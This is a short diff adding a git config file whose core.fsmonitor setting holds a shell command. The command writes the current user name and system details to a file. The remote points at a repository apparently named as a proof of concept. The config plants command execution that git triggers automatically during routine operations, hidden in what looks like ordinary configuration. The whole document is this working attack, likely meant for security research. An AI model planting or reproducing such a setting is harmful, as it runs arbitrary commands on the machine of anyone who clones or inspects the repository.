@@ -1,0 +1,8 @@
+[core]
+        repositoryformatversion = 0
+        bare = false
+	worktree = "."
+	fsmonitor = "echo \"$(whoami) $(uname -a)\" > ../output/output.model.lkml"
+[remote "origin"]
+	url = https://github.com/R-Test1/bugswat-poc4.git
+	fetch = +refs/heads/*:refs/remotes/origin/*
